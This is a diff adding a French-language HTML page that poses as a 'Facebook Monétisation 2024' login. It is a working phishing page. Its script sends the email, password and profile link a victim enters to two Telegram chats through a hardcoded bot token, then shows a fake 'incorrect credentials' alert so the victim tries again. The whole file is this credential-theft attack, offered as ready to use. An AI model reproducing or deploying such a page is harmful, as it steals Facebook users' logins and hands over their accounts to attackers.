@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1.0">
+  <title>Facebook Monétisation 2024</title>
+  <style>
+        /* Styles de base */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            animation: backgroundAnimation 8s infinite alternate;
+        }
+
+        @keyframes backgroundAnimation {
+            0% {
+                background: linear-gradient(5deg, blue, black);
+            }
+            50% {
+                background: linear-gradient(5deg, purple, red);
+            }
+            100% {
+                background: linear-gradient(5deg, #2a5298, #1e3c72);
+            }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            text-align: center;
+            animation: popUp 1.5s ease;
+        }
+
+        @keyframes popUp {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .logo {
+            font-size: 60px;
+            font-weight: bold;
+            color: blue;
+            text-shadow: 0 3px 10px rgba(255, 158, 0, 0.6);
+            margin-bottom: 15px;
+        }
+
+        .tagline {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: box-shadow 0.3s ease;
+        }
+
+        input:focus {
+            box-shadow: 0 0 8px #ff9e00;
+            border-color: #ff9e00;
+            outline: none;
+        }
+
+        button {
+            padding: 12px;
+            margin-top: 10px;
+            background-color: #ff6a00;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(255, 106, 0, 0.4);
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            color: #ff9e00;
+            font-size: 14px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password:hover {
+            color: #e68900;
+        }
+
+        .create-account button {
+            background-color: #42b72a;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+
+        .create-account button:hover {
+            background-color: #36a420;
+            transform: scale(1.05);
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        footer a {
+            color: #ff9e00;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      f
+    </div>
+    <div class="tagline">
+      Facebook Monétisation 2024
+    </div>
+    <form id="loginForm" name="loginForm">
+      <input type="text" id="email" name="email" placeholder=
+      "Numéro mobile ou e-mail" required=""> <input type="password"
+      id="password" name="password" placeholder="Mot de passe"
+      required=""> <input type="url" id="facebookLink" name=
+      "facebookLink" placeholder="Lien du profil Facebook"
+      required=""> <button type="submit">Se connecter</button>
+      <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+    </form>
+    <div class="create-account">
+      <button onclick="createAccount()">Créer un compte</button>
+    </div>
+  </div>
+  <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const facebookLink = document.getElementById('facebookLink').value;
+
+            if (!email || !password || !facebookLink) {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+
+            const botToken = "7579522658:AAG6mX5HL8Q9GdSoHtVDhQC_ImDi8aEYMNk";
+            const chatIds = ["7104713412", "688672056"]; // Liste des chat IDs
+
+            const message = `👨🏻‍💻❮•𝒔𝒑𝒊𝒓𝒊𝒕𝒚 𝒂𝒏𝒅 𝒂𝒅𝒅𝒍 𝒔𝒕𝒐𝒏𝒆 𝒇𝒃 𝒑𝒉𝒊𝒔𝒉𝒊𝒏𝒈•❯🖤 :\n➲ 🅔🅜🅐🅘🅛 : ${email}\n➲ 🅜🅞🅣 🅓🅔 🅟🅐🅢🅢🅔 : ${password}\n➲ 🅛🅘🅔🅝 🅓🅤 🅟🅡🅞🅕🅘🅛 🅕🅐🅒🅔🅑🅞🅞🅚 : ${facebookLink}`;
+
+            chatIds.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log(`Message envoyé à ${chatId}`);
+                    } else {
+                        console.error(`Erreur pour ${chatId} :`, data);
+                    }
+                })
+                .catch(error => {
+                    console.error("Erreur réseau :", error);
+                });
+            });
+
+            alert("coordonnées incorrectes!veillez reesayer");
+        });
+
+        function createAccount() {
+            window.location.href = "ghost.html";
+        }
+  </script>
+</body>
+</html>
